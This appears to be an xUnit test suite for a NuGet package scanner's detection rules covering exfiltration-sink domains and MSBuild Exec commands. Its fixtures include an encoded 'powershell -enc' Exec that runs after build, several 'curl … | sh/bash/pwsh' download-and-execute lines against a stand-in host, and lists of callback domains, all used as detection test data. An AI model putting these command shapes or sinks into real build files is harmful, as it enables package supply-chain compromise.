namespace Silvergun.PackageAnalysis.NuGet.Tests;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.Json;

using Microsoft.ApplicationInspector.RulesEngine;

using Silvergun;

using Xunit;

/// <summary>
/// Coverage for the Silvergun-owned AppInspector ruleset (<c>docs/agent/tasks/silvergun-script-ruleset.md</c>):
/// <c>SG0001</c>/<c>SG0002</c> (OOB callback / exfiltration-sink domains, <c>Resources/SilvergunRules/callback_domains.json</c>)
/// and <c>SG0010</c>/<c>SG0011</c> (MSBuild <c>&lt;Exec&gt;</c> execution primitives,
/// <c>Resources/SilvergunRules/msbuild_exec.json</c>). These rules exist to reach the file shapes a <c>.nupkg</c>
/// actually ships (<c>.nuspec</c>/<c>.targets</c>/<c>.props</c>) that the embedded OSSGadget rules cannot, per the
/// gap pinned in <see cref="ScriptRuleLanguageGatingTests"/>.
/// <para>
/// The three structural guards below (ungated, no dead <c>"type": "string"</c> anchor, severity floor) are each
/// paired with a mutation-check test that proves the guard logic can actually fail: it is run a second time against
/// an in-test synthetic fixture rule carrying the forbidden shape, never against an edited copy of the shipped JSON.
/// </para>
/// </summary>
public sealed class SilvergunRulesetTests : IDisposable
{
    #region Constructors
    public SilvergunRulesetTests()
    {
        Runtime.Initialize("Silvergun", "TESTS");
        this.directory = Path.Combine(Path.GetTempPath(), "silvergun-sg-ruleset-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(this.directory);
    }
    #endregion

    #region Methods — acceptance criteria 1-5
    // AC1: the exact case the spec says yields zero findings today — a .nuspec whose <repository url> is a
    // pipedream.net callback. Routed through ScanPackageMetadata (the real end-to-end entry point for a manifest),
    // not ScanFile, since that is what PackageScanner actually calls for a .nuspec.
    [Fact]
    public void ScanPackageMetadata_NuspecRepositoryUrlCallbackDomain_ProducesSG0001Finding()
    {
        var nuspec = BuildNuspec(description: "Utility helpers.", repositoryUrl: $"https://x.{CallbackHost}/r");
        var path = Write("Contoso.Utilities.nuspec", nuspec);

        var findings = new ScriptRuleScanner().ScanPackageMetadata(path, "Contoso.Utilities.nuspec");

        Assert.Contains(findings, f => f.RuleId.Equals("SG0001", StringComparison.OrdinalIgnoreCase));
    }

    // AC2: the same domain in a .targets and a .props file also produces SG0001 (these resolve to AppInspector's
    // default/no-language LanguageInfo, which is exactly why the rule must be ungated).
    [Theory]
    [InlineData("build.targets")]
    [InlineData("build.props")]
    public void Scan_CallbackDomainInBuildFile_ProducesSG0001Finding(string fileName)
    {
        var content = $"<Project>\n  <PropertyGroup>\n    <Url>https://{CallbackHost}/collect</Url>\n  </PropertyGroup>\n</Project>\n";
        var path = Write(fileName, content);

        var findings = new ScriptRuleScanner().ScanFile(path, fileName);

        Assert.Contains(findings, f => f.RuleId.Equals("SG0001", StringComparison.OrdinalIgnoreCase));
    }

    // AC3: an <Exec Command="powershell -enc ..."/> in a .targets fires BOTH the informational SG0010 (an Exec
    // task exists at all) and the high-signal SG0011 (its Command carries a download/encoded-execution primitive).
    [Fact]
    public void Scan_ExecPowershellEncodedCommand_ProducesSG0010AndSG0011()
    {
        var content = "<Project><Target Name=\"Install\" AfterTargets=\"Build\">\n" +
            "    <Exec Command=\"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\" />\n" +
            "</Target></Project>\n";
        var path = Write("build.targets", content);

        var findings = new ScriptRuleScanner().ScanFile(path, "build.targets");

        Assert.Contains(findings, f => f.RuleId.Equals("SG0010", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(findings, f => f.RuleId.Equals("SG0011", StringComparison.OrdinalIgnoreCase));
    }

    // AC4: a benign .nuspec (no domains) and a benign .targets (no Exec, no domains) produce zero SG* findings —
    // the new ruleset must not fire on ordinary package content.
    [Fact]
    public void ScanPackageMetadata_BenignNuspec_ProducesNoSGFindings()
    {
        var nuspec = BuildNuspec(description: "Utility helpers for Contoso applications.", repositoryUrl: "https://github.com/contoso/utilities");
        var path = Write("Contoso.Utilities.nuspec", nuspec);

        var findings = new ScriptRuleScanner().ScanPackageMetadata(path, "Contoso.Utilities.nuspec");

        Assert.DoesNotContain(findings, f => f.RuleId.StartsWith("SG", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Scan_BenignTargets_ProducesNoSGFindings()
    {
        var content = "<Project>\n  <Target Name=\"Build\">\n    <Message Text=\"Building...\" />\n  </Target>\n</Project>\n";
        var path = Write("build.targets", content);

        var findings = new ScriptRuleScanner().ScanFile(path, "build.targets");

        Assert.DoesNotContain(findings, f => f.RuleId.StartsWith("SG", StringComparison.OrdinalIgnoreCase));
    }

    // AC5: RedactProse still applies to the new rule. A callback domain appearing ONLY inside <description> produces
    // no SG0001 finding (the prose body is blanked before scanning), while ScanPackageMetadata_NuspecRepositoryUrl...
    // above shows the identical domain in <repository url> — a non-prose element — DOES fire. Together the two tests
    // are the acceptance criterion: same domain, redacted span silent, non-redacted span loud.
    [Fact]
    public void ScanPackageMetadata_CallbackDomainOnlyInDescription_ProducesNoSG0001Finding()
    {
        var nuspec = BuildNuspec(
            description: $"See https://x.{CallbackHost}/docs for usage notes.",
            repositoryUrl: "https://github.com/contoso/utilities");
        var path = Write("Contoso.Utilities.nuspec", nuspec);

        // The domain really does survive redaction as text (proving the miss below is the prose blank, not a typo).
        var redacted = ScriptRuleScanner.RedactProse(nuspec);
        Assert.DoesNotContain(CallbackHost, redacted, StringComparison.Ordinal);

        var findings = new ScriptRuleScanner().ScanPackageMetadata(path, "Contoso.Utilities.nuspec");

        Assert.DoesNotContain(findings, f => f.RuleId.Equals("SG0001", StringComparison.OrdinalIgnoreCase));
    }
    #endregion

    #region Methods — suffix false-positive regression (POST-IMPLEMENTATION CORRECTIONS #2)
    // interact.shop / transfer.shopping / file.iogames.com / notpipedream.net are near-miss LONGER hostnames that an
    // unanchored alternation would swallow; the corresponding genuine hosts (including the subdomain case
    // x.pipedream.net, which the anchor must still admit) must still fire.
    [Theory]
    [InlineData("interact.sh", "SG0001", true)]
    [InlineData("interact.shop", "SG0001", false)]
    [InlineData("pipedream.net", "SG0001", true)]
    [InlineData("notpipedream.net", "SG0001", false)]
    [InlineData("x.pipedream.net", "SG0001", true)]
    [InlineData("transfer.sh", "SG0002", true)]
    [InlineData("transfer.shopping", "SG0002", false)]
    [InlineData("file.io", "SG0002", true)]
    [InlineData("file.iogames.com", "SG0002", false)]
    public void Scan_DomainSuffixNearMiss_FiresOnlyOnGenuineHost(string host, string ruleId, bool expectFinding)
    {
        var content = $"<Project><Target Name=\"X\"><Message Text=\"see https://{host}/x\" /></Target></Project>\n";
        var path = Write("probe.targets", content);

        var findings = new ScriptRuleScanner().ScanFile(path, "probe.targets");

        Assert.Equal(expectFinding, findings.Any(f => f.RuleId.Equals(ruleId, StringComparison.OrdinalIgnoreCase)));
        if (!expectFinding)
            Assert.DoesNotContain(findings, f => f.RuleId.StartsWith("SG000", StringComparison.OrdinalIgnoreCase));
    }

    // api.telegram.org/bot is the one alternative in SG0002 deliberately given only a LEADING anchor (a real bot URL
    // is "bot123456789:ABC.../sendMessage" with no separator after "bot"), so it must fire on a realistic bot URL.
    [Fact]
    public void Scan_TelegramBotUrl_ProducesSG0002_DespiteNoTrailingAnchor()
    {
        var content = "<Project><Target Name=\"X\"><Message Text=\"https://api.telegram.org/bot123456789:ABC-token/sendMessage\" /></Target></Project>\n";
        var path = Write("probe.targets", content);

        var findings = new ScriptRuleScanner().ScanFile(path, "probe.targets");

        Assert.Contains(findings, f => f.RuleId.Equals("SG0002", StringComparison.OrdinalIgnoreCase));
    }

    // Pinned, accepted residual (spec, POST-IMPLEMENTATION CORRECTIONS #2): because api.telegram.org/bot has no
    // trailing anchor, "api.telegram.org/bothersome" also matches. This is a deliberate trade-off, not a bug — pinned
    // so a future "helpful" trailing-anchor fix (which would silently break every real bot webhook URL) is a visible,
    // deliberate decision rather than an accidental regression discovered later.
    [Fact]
    public void Scan_TelegramBotPrefixResidual_AlsoMatches_KnownAcceptedResidual()
    {
        var content = "<Project><Target Name=\"X\"><Message Text=\"https://api.telegram.org/bothersome-text\" /></Target></Project>\n";
        var path = Write("probe.targets", content);

        var findings = new ScriptRuleScanner().ScanFile(path, "probe.targets");

        Assert.Contains(findings, f => f.RuleId.Equals("SG0002", StringComparison.OrdinalIgnoreCase));
    }
    #endregion

    #region Methods — structural guards (mutation-provable)
    // GUARD: no shipped SG* rule declares applies_to. This is the guard against someone later "helpfully" re-gating
    // to e.g. ["xml"], which the spec's measurement shows makes the rule permanently unreachable on .targets/.props/
    // .nuspec (they resolve to AppInspector's default, nameless LanguageInfo).
    [Fact]
    public void SilvergunRules_NoRuleDeclaresAppliesTo()
    {
        var violations = RulesDeclaringAppliesTo(SilvergunRules());

        Assert.Empty(violations);
    }

    // MUTATION CHECK for the guard above: a synthetic rule that DOES declare applies_to must be caught. Proves the
    // guard is not vacuously true — it is exercised against a fixture shape it must reject, not the shipped JSON.
    [Fact]
    public void AppliesToGuard_CanFail_WhenAFixtureRuleDeclaresAppliesTo()
    {
        var mutated = ParseRules("""
            [
              {
                "id": "SG9999",
                "severity": "moderate",
                "applies_to": [ "xml" ],
                "patterns": [ { "pattern": "x", "type": "substring" } ]
              }
            ]
            """);

        var violations = RulesDeclaringAppliesTo(mutated);

        Assert.Contains("SG9999", violations);
    }

    // GUARD: no pattern uses "type": "string" with a literal whose first character is not [A-Za-z0-9_]. AppInspector
    // compiles a "string" pattern with implicit \b anchors, so a literal starting with a non-word character (e.g.
    // "<Exec ") can never match — exactly the defect that made SG0010 permanently dead the first time it was
    // authored. Checked over EVERY pattern of EVERY rule (SG0002 alone has three patterns[] entries).
    [Fact]
    public void SilvergunRules_NoStringTypePatternHasNonWordLeadingChar()
    {
        var violations = StringPatternsWithBadLeadingChar(SilvergunRules());

        Assert.Empty(violations);
    }

    // MUTATION CHECK: a synthetic "type": "string" pattern literal starting with "<" must be caught — this is
    // precisely the shape that made SG0010 dead on arrival before the fix to "type": "substring".
    [Fact]
    public void StringPatternGuard_CanFail_WhenAFixturePatternStartsWithNonWordChar()
    {
        var mutated = ParseRules("""
            [
              {
                "id": "SG9998",
                "severity": "moderate",
                "patterns": [ { "pattern": "<Exec ", "type": "string" } ]
              }
            ]
            """);

        var violations = StringPatternsWithBadLeadingChar(mutated);

        Assert.Contains("SG9998", violations.Select(v => v.RuleId));
    }

    // GUARD: every SG* rule's severity is Critical/Important/Moderate (ScriptRuleScanner.SeverityFloor) — anything
    // lower is silently discarded by the RuleProcessor, so a rule below the floor does not exist in practice.
    // SG0002 and SG0010 sit EXACTLY at the floor (moderate), so this is deliberately a boundary check.
    [Fact]
    public void SilvergunRules_AllSeveritiesAreAtOrAboveModerateFloor()
    {
        var rules = SilvergunRules();
        var violations = RulesBelowSeverityFloor(rules);

        Assert.Empty(violations);

        // Boundary: SG0002 and SG0010 are severity "moderate" exactly — the floor's lowest admitted value — and the
        // guard must accept them, not just rules strictly above the floor.
        Assert.Equal("moderate", Severity(Rule(rules, "SG0002")), StringComparer.OrdinalIgnoreCase);
        Assert.Equal("moderate", Severity(Rule(rules, "SG0010")), StringComparer.OrdinalIgnoreCase);
    }

    // MUTATION CHECK: a synthetic rule below the floor (bestpractice — one of the two severities the scanner
    // silently discards, see ScriptRuleScanner.SeverityFloor) must be caught.
    [Fact]
    public void SeverityFloorGuard_CanFail_WhenAFixtureRuleIsBelowFloor()
    {
        var mutated = ParseRules("""
            [
              {
                "id": "SG9997",
                "severity": "bestpractice",
                "patterns": [ { "pattern": "x", "type": "substring" } ]
              }
            ]
            """);

        var violations = RulesBelowSeverityFloor(mutated);

        Assert.Contains("SG9997", violations);
    }
    #endregion

    #region Methods — Docs file-type suppression latent trap
    // EMPIRICAL PIN: AppInspector maps ".txt" to LangFileType.Docs, which suppresses scopes: ["code"] matches
    // wholesale — even for an ungated rule that would otherwise fire everywhere. Confirmed directly against the real
    // scanner: a callback domain that fires on a .targets (see acceptance criterion 2 above) produces NOTHING on the
    // byte-identical content under .txt.
    [Fact]
    public void Scan_CallbackDomainInTxtFile_YieldsNoFindings_DocsFileTypeSuppression()
    {
        var content = $"See https://{CallbackHost}/collect for details.\n";
        var path = Write("notes.txt", content);

        var findings = new ScriptRuleScanner().ScanFile(path, "notes.txt");

        Assert.Empty(findings);
    }

    // GUARD: the current script inventory (NuGetPackage.IsScript: .ps1/.psm1/.targets/.props — NuGetPackage.cs:241-243)
    // contains no extension AppInspector maps to LangFileType.Docs. No inventoried extension is exploitable today —
    // this guard exists so that a FUTURE addition of e.g. ".md"/".txt" to the inventory fails this test loudly instead
    // of silently making those files unscannable by every ungated rule.
    [Fact]
    public void ScriptInventoryExtensions_MapToNoDocsFileType_SoFutureAdditionFailsLoudly()
    {
        var languages = new Languages();

        foreach (var ext in InventoriedScriptExtensions)
        {
            languages.FromFileNameOut("probe" + ext, out var info);
            var type = info?.Type ?? LanguageInfo.LangFileType.Code;
            Assert.NotEqual(LanguageInfo.LangFileType.Docs, type);
        }
    }

    // MUTATION CHECK for the guard above: ".txt" — a real AppInspector extension known to map to Docs — must be
    // caught by the same check, proving the guard is not vacuously true.
    [Fact]
    public void DocsFileTypeGuard_CanFail_ForATxtExtension()
    {
        var languages = new Languages();

        languages.FromFileNameOut("probe.txt", out var info);

        Assert.Equal(LanguageInfo.LangFileType.Docs, info?.Type);
    }
    #endregion

    #region Methods — SG0011 curl-pipe-shell contract (Review-round corrections #4 and #5)
    // Pins the tightened curl-pipe-shell pattern (spec, "Review-round corrections" #4 and #5): the shell token must
    // sit immediately after the pipe (an optional sudo/env wrapper and an optional absolute path are still admitted),
    // and PowerShell (pwsh/powershell) is included alongside the POSIX shells. Written as must-fire/must-not-fire
    // pairs so the pattern can be retuned later without silently losing the contract — see MUST-NOT-FIRE cases below,
    // which are the exact download-and-SAVE shapes (correction #4) that the original unrestricted-gap pattern
    // wrongly matched. SG0010 is asserted on every row too: since every row is a real <Exec>, an SG0010 miss would
    // mean the file was never scanned at all, which would make an "absent SG0011" row a false pass rather than a
    // genuine negative.
    [Theory]
    // MUST FIRE — shell token immediately after the pipe, optionally via sudo/env and/or an absolute path.
    [InlineData("curl -s https://x.example/i.sh | sh", true)]
    [InlineData("curl -s https://x.example/i.sh | bash", true)]
    [InlineData("curl -sL https://x.example/i | /bin/sh", true)]
    [InlineData("curl -sL https://x.example/i | sudo bash", true)]
    [InlineData("curl -sL https://x.example/i | /usr/bin/env sh", true)]
    [InlineData("curl -sL https://x.example/i | zsh", true)]
    [InlineData("curl -sL https://x.example/a.ps1 | pwsh", true)]
    [InlineData("curl -sL https://x.example/a.ps1 | powershell -", true)]
    [InlineData("curl -sL https://x.example/a.ps1 | /usr/bin/pwsh", true)]
    // MUST NOT FIRE — download-and-save or unrelated piping; no shell token immediately after the pipe.
    [InlineData("curl -s https://x.example/v.json | jq -r .url > out.sh", false)]
    [InlineData("curl -sL https://x.example/r | tee report.sh", false)]
    [InlineData("curl -sL https://x.example/r | grep install", false)]
    [InlineData("curl -o setup.sh https://x.example/setup.sh", false)]
    public void Scan_ExecCurlPipeShellCommand_MatchesSG0011OnlyOnDownloadExecuteShape(string command, bool expectSg0011)
    {
        var content = "<Project><Target Name=\"Install\" AfterTargets=\"Build\">\n" +
            $"    <Exec Command=\"{XmlAttributeEscape(command)}\" />\n" +
            "</Target></Project>\n";
        var path = Write("probe.targets", content);

        var findings = new ScriptRuleScanner().ScanFile(path, "probe.targets");

        // Control column: SG0010 must fire on every row (they are all real <Exec> elements) — proves the file was
        // actually scanned, so an absent SG0011 below is a genuine "the pattern declined" rather than a silent skip.
        Assert.Contains(findings, f => f.RuleId.Equals("SG0010", StringComparison.OrdinalIgnoreCase));
        Assert.Equal(expectSg0011, findings.Any(f => f.RuleId.Equals("SG0011", StringComparison.OrdinalIgnoreCase)));
    }
    #endregion

    #region Methods — aggregation
    // Existing Aggregate contract (ScriptRuleScanner.Aggregate): the same callback domain matching on five separate
    // lines of one file collapses to ONE finding for that rule, with Occurrences == 5.
    [Fact]
    public void Scan_SameCallbackDomainOnFiveLines_AggregatesToOneFindingWithFiveOccurrences()
    {
        var lines = Enumerable.Range(0, 5).Select(i => $"<!-- see https://{CallbackHost}/collect{i} -->");
        var content = "<Project>\n" + string.Join("\n", lines) + "\n</Project>\n";
        var path = Write("probe.targets", content);

        var findings = new ScriptRuleScanner().ScanFile(path, "probe.targets");

        var sg0001 = Assert.Single(findings, f => f.RuleId.Equals("SG0001", StringComparison.OrdinalIgnoreCase));
        Assert.Equal(5, sg0001.Occurrences);
    }
    #endregion

    #region Methods — hostile input
    // A ~1 MB .targets of many <Exec  fragments must complete (no rule-engine timeout, no size-cap skip) against the
    // full embedded ruleset (measured baseline: 1.1 MB / 40,000 fragments ~16s — spec §3). Completion is asserted
    // directly (no exception, SG0010 still fires, proving the file was actually analyzed and not silently caught by
    // an engine-failure path that swallows the exception and returns no findings) rather than a tight wall-clock bound.
    [Fact]
    public void Scan_LargeTargetsWithManyExecFragments_CompletesAndIsNotSkipped()
    {
        const string fragment = "<Exec Command=\"echo hi\" />\n";
        var repeats = (1_000_000 / fragment.Length) + 1;
        var content = string.Concat(Enumerable.Repeat(fragment, repeats));
        Assert.True(content.Length < 5 * 1024 * 1024, "fixture must stay under the scanner's 5 MiB size cap.");
        var path = Write("huge.targets", content);

        var sw = Stopwatch.StartNew();
        IReadOnlyList<ScriptFinding> findings = Array.Empty<ScriptFinding>();
        var ex = Record.Exception(() => findings = new ScriptRuleScanner().ScanFile(path, "huge.targets"));
        sw.Stop();

        Assert.Null(ex);
        Assert.True(sw.Elapsed < TimeSpan.FromMinutes(2), $"scan took {sw.Elapsed}, exceeding the generous hostile-input budget.");
        Assert.Contains(findings, f => f.RuleId.Equals("SG0010", StringComparison.OrdinalIgnoreCase));
    }

    // A ~1 MB run of near-miss domain text (the longer-hostname near-misses from the suffix regression above,
    // repeated) must also complete without a timeout or being skipped, and must not spuriously fire SG0001/SG0002.
    [Fact]
    public void Scan_LargeNearMissDomainText_CompletesAndIsNotSkipped()
    {
        const string nearMiss = "interact.shop transfer.shopping file.iogames.com notpipedream.net ";
        var repeats = (1_000_000 / nearMiss.Length) + 1;
        var content = string.Concat(Enumerable.Repeat(nearMiss, repeats));
        Assert.True(content.Length < 5 * 1024 * 1024, "fixture must stay under the scanner's 5 MiB size cap.");
        var path = Write("huge-nearmiss.targets", content);

        var sw = Stopwatch.StartNew();
        IReadOnlyList<ScriptFinding> findings = Array.Empty<ScriptFinding>();
        var ex = Record.Exception(() => findings = new ScriptRuleScanner().ScanFile(path, "huge-nearmiss.targets"));
        sw.Stop();

        Assert.Null(ex);
        Assert.True(sw.Elapsed < TimeSpan.FromMinutes(2), $"scan took {sw.Elapsed}, exceeding the generous hostile-input budget.");
        Assert.DoesNotContain(findings, f => f.RuleId.Equals("SG0001", StringComparison.OrdinalIgnoreCase)
            || f.RuleId.Equals("SG0002", StringComparison.OrdinalIgnoreCase));
    }

    // Quadratic-blowup probe specifically for SG0011: SG0011's shape is
    // Command\s*=\s*"[^"\r\n]*(?:...)[^"\r\n]*", not nested, but able to restart its scan at every "Command=" token.
    // This builds ONE long line containing ~1000 "Command=\"" occurrences, each followed by a long run of non-quote
    // characters with NO closing quote anywhere on the line — so every occurrence forces a scan to end-of-line before
    // failing. A genuine SG0010 hit ("<Exec ") is included outside the hostile line so a non-empty, correct result
    // proves the file was actually analyzed rather than skipped or swallowed by an engine-failure catch.
    [Fact]
    public void Scan_Sg0011QuadraticBlowupProbe_CompletesAndIsNotSkipped()
    {
        const string commandToken = "Command=\"";
        var junk = new string('A', 1000);
        var occurrence = commandToken + junk;
        var hostileLine = string.Concat(Enumerable.Repeat(occurrence, 1000));   // ~1,009,000 chars, one line, no quotes closed

        var content = "<Project><Target Name=\"X\">\n" +
            "  <Exec Command=\"benign\" />\n" +           // guarantees SG0010 fires: proves the file was really analyzed
            hostileLine + "\n" +
            "</Target></Project>\n";
        Assert.True(content.Length < 5 * 1024 * 1024, "fixture must stay under the scanner's 5 MiB size cap.");
        var path = Write("huge-exec-blowup.targets", content);

        var sw = Stopwatch.StartNew();
        IReadOnlyList<ScriptFinding> findings = Array.Empty<ScriptFinding>();
        var ex = Record.Exception(() => findings = new ScriptRuleScanner().ScanFile(path, "huge-exec-blowup.targets"));
        sw.Stop();

        Assert.Null(ex);
        Assert.True(sw.Elapsed < TimeSpan.FromMinutes(2), $"scan took {sw.Elapsed}, exceeding the generous hostile-input budget.");
        Assert.Contains(findings, f => f.RuleId.Equals("SG0010", StringComparison.OrdinalIgnoreCase));
    }
    #endregion

    #region Methods — helpers
    public void Dispose()
    {
        try
        {
            if (Directory.Exists(this.directory))
                Directory.Delete(this.directory, recursive: true);
        }
        catch (IOException)
        {
            // A leaked temp directory must never fail a test run.
        }
    }

    private string Write(string fileName, string content)
    {
        var path = Path.Combine(this.directory, fileName);
        File.WriteAllText(path, content);
        return path;
    }

    // Minimal XML attribute-value escaping for command-line fixtures written into an .targets Command="..." attribute
    // (e.g. the literal ">" in "jq -r .url > out.sh" must reach the parsed attribute value unescaped-back-to-">",
    // which requires writing "&gt;" in the fixture source). None of this suite's fixture commands contain '&', '<',
    // or '"', but '&' and '<' are escaped too so this helper stays correct if a future row does.
    private static string XmlAttributeEscape(string value) => value
        .Replace("&", "&amp;", StringComparison.Ordinal)
        .Replace("<", "&lt;", StringComparison.Ordinal)
        .Replace(">", "&gt;", StringComparison.Ordinal);

    private static string BuildNuspec(string description, string repositoryUrl) => string.Join("\n",
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
        "<package><metadata>",
        "  <id>Contoso.Utilities</id>",
        "  <version>1.0.0</version>",
        $"  <description>{description}</description>",
        $"  <repository type=\"git\" url=\"{repositoryUrl}\" />",
        "</metadata></package>");

    // Reads the two Silvergun-owned ruleset resources from the shipped assembly's manifest resources — the same
    // resources ScriptRuleScanner.BuildProcessor loads — so the structural-guard assertions describe what is
    // actually embedded, not what happens to be on disk under the csproj glob.
    private static JsonElement[] SilvergunRules() => silvergunRules.Value;

    private static JsonElement[] LoadSilvergunRules()
    {
        var assembly = typeof(ScriptRuleScanner).Assembly;
        var names = assembly.GetManifestResourceNames()
            .Where(n => n.Contains(".Resources.SilvergunRules.", StringComparison.Ordinal)
                     && n.EndsWith(".json", StringComparison.OrdinalIgnoreCase))
            .OrderBy(n => n, StringComparer.Ordinal);

        var loaded = new List<JsonElement>();
        foreach (var name in names)
        {
            using var stream = assembly.GetManifestResourceStream(name)!;
            using var reader = new StreamReader(stream);
            loaded.AddRange(JsonDocument.Parse(reader.ReadToEnd()).RootElement.EnumerateArray());
        }

        Assert.NotEmpty(loaded);
        return loaded.ToArray();
    }

    // Parses an in-test synthetic rule array (mutation-check fixtures) — never the shipped JSON.
    private static JsonElement[] ParseRules(string json) =>
        JsonDocument.Parse(json).RootElement.EnumerateArray().ToArray();

    private static JsonElement Rule(IEnumerable<JsonElement> rules, string id) =>
        rules.Single(r => Id(r).Equals(id, StringComparison.OrdinalIgnoreCase));

    private static string Id(JsonElement rule) => rule.GetProperty("id").GetString() ?? string.Empty;

    private static string Severity(JsonElement rule) => rule.GetProperty("severity").GetString() ?? string.Empty;

    // GUARD LOGIC: rule ids that declare an "applies_to" property at all (any content, even an empty array).
    private static string[] RulesDeclaringAppliesTo(IEnumerable<JsonElement> rules) => rules
        .Where(r => r.TryGetProperty("applies_to", out _))
        .Select(Id)
        .ToArray();

    // GUARD LOGIC: (rule id, pattern literal) pairs where a "type": "string" pattern's literal does not start with
    // [A-Za-z0-9_] — the shape AppInspector's implicit \b anchoring can never match. Walks EVERY pattern of EVERY
    // rule (not just patterns[0]) since SG0002 alone carries three entries.
    private static (string RuleId, string Pattern)[] StringPatternsWithBadLeadingChar(IEnumerable<JsonElement> rules) => rules
        .SelectMany(r => r.GetProperty("patterns").EnumerateArray().Select(p => (Rule: r, Pattern: p)))
        .Where(t => (t.Pattern.TryGetProperty("type", out var type) ? type.GetString() : null) == "string")
        .Select(t => (RuleId: Id(t.Rule), Literal: t.Pattern.GetProperty("pattern").GetString() ?? string.Empty))
        .Where(t => t.Literal.Length == 0 || !IsWordChar(t.Literal[0]))
        .Select(t => (t.RuleId, t.Literal))
        .ToArray();

    private static bool IsWordChar(char c) =>
        (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '_';

    // GUARD LOGIC: rule ids whose severity is not one of Critical/Important/Moderate (ScriptRuleScanner.SeverityFloor).
    private static string[] RulesBelowSeverityFloor(IEnumerable<JsonElement> rules) => rules
        .Where(r => !FloorSeverities.Contains(Severity(r), StringComparer.OrdinalIgnoreCase))
        .Select(Id)
        .ToArray();
    #endregion

    #region Fields
    // A fixture host under a domain SG0001 matches. Generated into a temp file at run time and deleted on dispose —
    // never committed as package content — and the label makes it unmistakably a fixture rather than live infra.
    private const string CallbackHost = "silvergun-fixture-not-live.pipedream.net";

    private static readonly string[] FloorSeverities = ["critical", "important", "moderate"];

    // Mirror of NuGetPackage.IsScript's extension set (NuGetPackage.cs:241-243). This is a deliberate hand-mirror,
    // not a reflection call, so that a change to the real inventory must be reflected here too — the whole point of
    // ScriptInventoryExtensions_MapToNoDocsFileType_SoFutureAdditionFailsLoudly is to catch a silent addition.
    private static readonly string[] InventoriedScriptExtensions = [".ps1", ".psm1", ".targets", ".props"];

    private static readonly Lazy<JsonElement[]> silvergunRules = new(LoadSilvergunRules);

    private readonly string directory;
    #endregion
}
